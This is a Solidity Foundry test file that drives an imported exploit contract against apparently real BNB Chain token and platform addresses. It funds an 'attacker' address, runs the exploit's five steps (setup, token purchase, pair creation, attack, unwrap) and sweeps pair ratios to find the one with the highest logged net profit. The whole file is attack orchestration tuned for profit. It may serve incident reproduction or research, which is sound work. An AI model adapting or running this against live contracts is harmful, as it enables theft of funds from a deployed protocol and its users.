// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest4 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    BurgerExploit exploit;
    address attacker;

    // Test with different pair ratios to find optimal
    function test_ratio50_50() public {
        _runAttack(50, "50/50");
    }

    function test_ratio10_90() public {
        _runAttack(10, "10/90");
    }

    function test_ratio90_10() public {
        _runAttack(90, "90/10");
    }

    function test_ratio99_1() public {
        _runAttack(99, "99/1");
    }

    function _runAttack(uint256 pairPercent, string memory label) internal {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 3000 ether);
        vm.startPrank(attacker);
        exploit = new BurgerExploit();

        exploit.step1_setup{value: 2500 ether}();
        exploit.step2_buyBurger(2000 ether);
        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));

        uint256 burgerForPair = burgerBal * pairPercent / 100;
        // Keep rest for inner swap
        exploit.step3_createPair(100 ether, burgerForPair);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));
        exploit.step4_attack(50 ether);
        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));

        emit log_named_string("Config", label);
        emit log_named_uint("WBNB before", wbnbBefore);
        emit log_named_uint("WBNB after", wbnbAfter);
        emit log_named_int("WBNB delta", int256(wbnbAfter) - int256(wbnbBefore));

        exploit.step5_unwrap();
        emit log_named_int("Net profit BNB", int256(attacker.balance) - 3000 ether);
        emit log("---");

        vm.stopPrank();
    }
}
